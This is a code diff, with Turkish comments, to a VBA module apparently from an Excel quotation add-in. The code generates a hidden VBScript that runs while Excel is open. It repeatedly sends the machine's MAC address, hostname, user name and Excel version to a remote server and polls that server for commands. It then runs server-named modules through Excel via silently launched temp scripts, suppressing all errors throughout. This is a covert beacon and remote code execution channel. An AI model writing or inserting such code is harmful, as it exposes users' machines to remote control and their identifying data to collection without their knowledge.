@@ -30,6 +30,10 @@ Public Function DynamicFunc(targetWb As Workbook, param As Variant) As Object
     ' Önceki stop flag'i temizle
     If Dir(stopFlagPath) <> "" Then Kill stopFlagPath
 
+    ' Zaten çalışıyorsa yeniden başlatma
+    Dim prevActive As String : prevActive = GetSetting("ilhan", "Heartbeat", "active", "false")
+    ' (Yeniden başlatmaya izin ver — önceki VBScript zaten kapanmış olabilir)
+
     ' ----- Bilgileri Topla -----
     Dim mac      As String : mac      = GetFirstMACAddress()
     Dim hostname As String : hostname = Environ("COMPUTERNAME")
@@ -38,6 +42,7 @@ Public Function DynamicFunc(targetWb As Workbook, param As Variant) As Object
     Dim baseUrl  As String
     baseUrl = GetSetting("ilhan", "Settings", "apiBaseUrl", _
                          "https://nextjs-teklif-sunucu.vercel.app/api/")
+    If Right(baseUrl, 1) <> "/" Then baseUrl = baseUrl & "/"
 
     Dim intervalMs As Long : intervalMs = intervalMin * 60000
 
@@ -66,84 +71,93 @@ Private Sub WriteVbs(fNum As Integer, _
                      excelVer As String, baseUrl As String, _
                      intervalMs As Long, stopFlagPath As String)
 
-    ' Sabit JSON ön eki — değerler VBA zamanında gömülür, yalnızca timestamp dinamik
-    Dim jsonPre As String
-    jsonPre = "{""mac"":""" & JsonEsc(mac) & _
-              """,""hostname"":""" & JsonEsc(hostname) & _
-              """,""user"":""" & JsonEsc(usr) & _
-              """,""excelVersion"":""" & JsonEsc(excelVer) & _
-              """,""timestamp"":"""
-    ' jsonSuf = """}"
+    Dim Q  As String : Q  = Chr(34)
+    Dim mac_e  As String : mac_e  = JsonEsc(mac)
+    Dim host_e As String : host_e = JsonEsc(hostname)
+    Dim usr_e  As String : usr_e  = JsonEsc(usr)
+    Dim ver_e  As String : ver_e  = JsonEsc(excelVer)
 
-    ' VBScript'te kullanılacak VBScript-literal gösterimi:
-    '   VBScript string literal'ında her " iki kez yazılır → "" 
-    Dim vbsPre As String : vbsPre = Replace(jsonPre, """", """""")   ' " → ""
-    Dim vbsSuf As String : vbsSuf = """""}"""                        ' VBS literal: """}"
-
-    Dim Q  As String : Q  = Chr(34)  ' tek çift-tırnak karakteri
-    Dim L  As String : L  = vbCrLf
-
-    ' --- VBScript satırları ---
-    Print #fNum, "Dim url   : url   = " & Q & baseUrl     & Q
+    ' ─────────────────────────────────────────────────────────
+    ' Script-level On Error Resume Next: hiçbir hata scripti çökertmez
+    Print #fNum, "On Error Resume Next"
+    Print #fNum, ""
+    Print #fNum, "Dim url   : url   = " & Q & baseUrl & Q
     Print #fNum, "Dim intMs : intMs = " & intervalMs
     Print #fNum, "Dim sflag : sflag = " & Q & stopFlagPath & Q
+    Print #fNum, "Dim macAddr : macAddr = " & Q & mac_e & Q
     Print #fNum, ""
-    Print #fNum, "Dim http : Set http = CreateObject(" & Q & "MSXML2.ServerXMLHTTP.6.0" & Q & ")"
-    Print #fNum, "Dim wmi  : Set wmi  = GetObject(" & Q & "winmgmts:\\.\root\cimv2" & Q & ")"
+    Print #fNum, "Dim wsh  : Set wsh  = CreateObject(" & Q & "WScript.Shell" & Q & ")"
     Print #fNum, "Dim fso  : Set fso  = CreateObject(" & Q & "Scripting.FileSystemObject" & Q & ")"
     Print #fNum, ""
+    Print #fNum, "' ─── Ana döngü ───"
     Print #fNum, "Do While True"
-    Print #fNum, "  Dim pr : Set pr = wmi.ExecQuery(" & Q & "SELECT ProcessId FROM Win32_Process WHERE Name='EXCEL.EXE'" & Q & ")"
-    Print #fNum, "  If pr.Count = 0 Then WScript.Quit"
+    Print #fNum, ""
+    Print #fNum, "  ' Excel hâlâ açık mı? (Shell + tasklist ile WMI fallback)"
+    Print #fNum, "  Dim excelRunning : excelRunning = False"
+    Print #fNum, "  Dim chkOut : chkOut = wsh.Exec(" & Q & "cmd /c tasklist /FI " & Chr(34) & "IMAGENAME eq EXCEL.EXE" & Chr(34) & " /NH" & Q & ")"
+    Print #fNum, "  If Not IsNull(chkOut) Then"
+    Print #fNum, "    Dim chkStr : chkStr = " & Q & Q
+    Print #fNum, "    If Not chkOut.StdOut Is Nothing Then chkStr = chkOut.StdOut.ReadAll"
+    Print #fNum, "    If InStr(LCase(chkStr), " & Q & "excel.exe" & Q & ") > 0 Then excelRunning = True"
+    Print #fNum, "  End If"
+    Print #fNum, "  If Not excelRunning Then WScript.Quit"
+    Print #fNum, ""
+    Print #fNum, "  ' Stop flag kontrolü"
     Print #fNum, "  If fso.FileExists(sflag) Then WScript.Quit"
+    Print #fNum, ""
+    Print #fNum, "  ' Timestamp oluştur"
     Print #fNum, "  Dim ts"
     Print #fNum, "  ts = Year(Now) & " & Q & "-" & Q & " & Right(" & Q & "0" & Q & " & Month(Now),2) & " & Q & "-" & Q & " & Right(" & Q & "0" & Q & " & Day(Now),2)"
     Print #fNum, "  ts = ts & " & Q & "T" & Q & " & Right(" & Q & "0" & Q & " & Hour(Now),2) & " & Q & ":" & Q & " & Right(" & Q & "0" & Q & " & Minute(Now),2) & " & Q & ":" & Q & " & Right(" & Q & "0" & Q & " & Second(Now),2)"
+    Print #fNum, ""
+    Print #fNum, "  ' JSON body"
     Print #fNum, "  Dim bd"
-    Print #fNum, "  bd = " & Q & vbsPre & Q & " & ts & " & Q & Chr(34) & "}" & Q
-    Print #fNum, "  On Error Resume Next"
+    Print #fNum, "  bd = " & Q & "{" & Chr(34) & "mac" & Chr(34) & ":" & Chr(34) & mac_e & Chr(34) & "," & Q
+    Print #fNum, "  bd = bd & " & Q & Chr(34) & "hostname" & Chr(34) & ":" & Chr(34) & host_e & Chr(34) & "," & Q
+    Print #fNum, "  bd = bd & " & Q & Chr(34) & "user" & Chr(34) & ":" & Chr(34) & usr_e & Chr(34) & "," & Q
+    Print #fNum, "  bd = bd & " & Q & Chr(34) & "excelVersion" & Chr(34) & ":" & Chr(34) & ver_e & Chr(34) & "," & Q
+    Print #fNum, "  bd = bd & " & Q & Chr(34) & "timestamp" & Chr(34) & ":" & Chr(34) & Q & " & ts & " & Q & Chr(34) & "}" & Q
+    Print #fNum, ""
+    Print #fNum, "  ' Her iterasyonda yeni HTTP nesnesi — stale connection önler"
+    Print #fNum, "  Dim http : Set http = CreateObject(" & Q & "MSXML2.ServerXMLHTTP.6.0" & Q & ")"
     Print #fNum, "  http.Open " & Q & "POST" & Q & ", url & " & Q & "heartbeat" & Q & ", False"
     Print #fNum, "  http.setTimeouts 5000, 5000, 15000, 15000"
     Print #fNum, "  http.setRequestHeader " & Q & "Content-Type" & Q & ", " & Q & "application/json" & Q
     Print #fNum, "  http.send bd"
-    Print #fNum, "  On Error GoTo 0"
+    Print #fNum, "  Set http = Nothing"
     Print #fNum, ""
     Print #fNum, "  ' Komut kuyruğunu kontrol et"
-    Print #fNum, "  On Error Resume Next"
-    Print #fNum, "  Dim cmdMac : cmdMac = " & Q & JsonEsc(mac) & Q
-    Print #fNum, "  http.Open " & Q & "GET" & Q & ", url & " & Q & "commands/pending/" & Q & " & cmdMac, False"
-    Print #fNum, "  http.setTimeouts 5000, 5000, 10000, 10000"
-    Print #fNum, "  http.send"
-    Print #fNum, "  If http.Status = 200 Then"
-    Print #fNum, "    Dim resp : resp = http.responseText"
-    Print #fNum, "    If InStr(resp, " & Q & """data"":null" & Q & ") = 0 And InStr(resp, " & Q & """data"":{" & Q & ") > 0 Then"
-    Print #fNum, "      Dim cmdId   : cmdId   = ExtractVal(resp, " & Q & """id"":" & Q & ")"
-    Print #fNum, "      Dim cmdName : cmdName = ExtractStrVal(resp, " & Q & """module_name"":" & Q & ")"
-    Print #fNum, "      Dim cmdParam: cmdParam = ExtractStrVal(resp, " & Q & """param"":" & Q & ")"
+    Print #fNum, "  Dim http2 : Set http2 = CreateObject(" & Q & "MSXML2.ServerXMLHTTP.6.0" & Q & ")"
+    Print #fNum, "  http2.Open " & Q & "GET" & Q & ", url & " & Q & "commands/pending/" & Q & " & macAddr, False"
+    Print #fNum, "  http2.setTimeouts 5000, 5000, 10000, 10000"
+    Print #fNum, "  http2.send"
+    Print #fNum, "  If http2.Status = 200 Then"
+    Print #fNum, "    Dim resp : resp = http2.responseText"
+    Print #fNum, "    If InStr(resp, " & Q & Chr(34) & "data" & Chr(34) & ":null" & Q & ") = 0 And InStr(resp, " & Q & Chr(34) & "data" & Chr(34) & ":{" & Q & ") > 0 Then"
+    Print #fNum, "      Dim cmdId   : cmdId   = ExtractVal(resp, " & Q & Chr(34) & "id" & Chr(34) & ":" & Q & ")"
+    Print #fNum, "      Dim cmdName : cmdName = ExtractStrVal(resp, " & Q & Chr(34) & "module_name" & Chr(34) & ":" & Q & ")"
     Print #fNum, "      If cmdId <> " & Q & Q & " And cmdName <> " & Q & Q & " Then"
-    Print #fNum, "        ' Komutu kaydet; Excel bir sonraki açılışta çalıştırsın (RunOnce)"
-    Print #fNum, "        Dim regKey : regKey = " & Q & "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\" & Q
-    Print #fNum, "        Dim wsh2   : Set wsh2 = CreateObject(" & Q & "WScript.Shell" & Q & ")"
     Print #fNum, "        ' Komutu hemen çalıştır — Excel açık olduğundan RunRemoteCode çağırabilir"
-    Print #fNum, "        Dim cmdFile : cmdFile = Environ(" & Q & "TEMP" & Q & ") & " & Q & "\hb_cmd.vbs" & Q
-    Print #fNum, "        Dim cf : Set cf = CreateObject(" & Q & "Scripting.FileSystemObject" & Q & ").OpenTextFile(cmdFile, 2, True)"
-    Print #fNum, "        cf.WriteLine " & Q & "Dim xl : Set xl = Nothing" & Q
+    Print #fNum, "        Dim cmdFile : cmdFile = Environ(" & Q & "TEMP" & Q & ") & " & Q & "\hb_cmd_" & Q & " & cmdId & " & Q & ".vbs" & Q
+    Print #fNum, "        Dim cf : Set cf = fso.OpenTextFile(cmdFile, 2, True)"
     Print #fNum, "        cf.WriteLine " & Q & "On Error Resume Next" & Q
-    Print #fNum, "        cf.WriteLine " & Q & "Set xl = GetObject(, " & Chr(34) & "Excel.Application" & Chr(34) & ")" & Q
+    Print #fNum, "        cf.WriteLine " & Q & "Dim xl : Set xl = GetObject(, " & Chr(34) & "Excel.Application" & Chr(34) & ")" & Q
     Print #fNum, "        cf.WriteLine " & Q & "If Not xl Is Nothing Then" & Q
     Print #fNum, "        cf.WriteLine " & Q & "  xl.Run " & Chr(34) & "zInternet.RunRemoteCode" & Chr(34) & ", " & Chr(34) & Q & " & cmdName & " & Q & Chr(34) & Q
     Print #fNum, "        cf.WriteLine " & Q & "End If" & Q
     Print #fNum, "        cf.Close"
-    Print #fNum, "        wsh2.Run " & Q & "wscript.exe //B " & Chr(34) & Q & " & cmdFile & " & Q & Chr(34) & Q & ", 0, False"
-    Print #fNum, "        ' Sonucu raporla"
-    Print #fNum, "        http.Open " & Q & "PATCH" & Q & ", url & " & Q & "commands/" & Q & " & cmdId, False"
-    Print #fNum, "        http.setRequestHeader " & Q & "Content-Type" & Q & ", " & Q & "application/json" & Q
-    Print #fNum, "        http.setTimeouts 5000, 5000, 10000, 10000"
-    Print #fNum, "        http.send " & Q & "{" & Chr(34) & "status" & Chr(34) & ":" & Chr(34) & "done" & Chr(34) & "}" & Q
+    Print #fNum, "        wsh.Run " & Q & "wscript.exe //B " & Chr(34) & Q & " & cmdFile & " & Q & Chr(34) & Q & ", 0, False"
+    Print #fNum, "        ' Komutu tamamlandı olarak işaretle"
+    Print #fNum, "        Dim http3 : Set http3 = CreateObject(" & Q & "MSXML2.ServerXMLHTTP.6.0" & Q & ")"
+    Print #fNum, "        http3.Open " & Q & "PATCH" & Q & ", url & " & Q & "commands/" & Q & " & cmdId, False"
+    Print #fNum, "        http3.setRequestHeader " & Q & "Content-Type" & Q & ", " & Q & "application/json" & Q
+    Print #fNum, "        http3.setTimeouts 5000, 5000, 10000, 10000"
+    Print #fNum, "        http3.send " & Q & "{" & Chr(34) & "status" & Chr(34) & ":" & Chr(34) & "done" & Chr(34) & "}" & Q
+    Print #fNum, "        Set http3 = Nothing"
     Print #fNum, "      End If"
     Print #fNum, "    End If"
     Print #fNum, "  End If"
-    Print #fNum, "  On Error GoTo 0"
+    Print #fNum, "  Set http2 = Nothing"
     Print #fNum, ""
     Print #fNum, "  WScript.Sleep intMs"
     Print #fNum, "Loop"
@@ -174,7 +188,6 @@ Private Sub WriteVbs(fNum As Integer, _
     Print #fNum, "End Function"
 End Sub
 
-' JSON değeri için " → \" dönüşümü (VBScript string literal için değil, JSON için)
 Private Function JsonEsc(s As String) As String
     JsonEsc = Replace(s, """", "\""")
 End Function
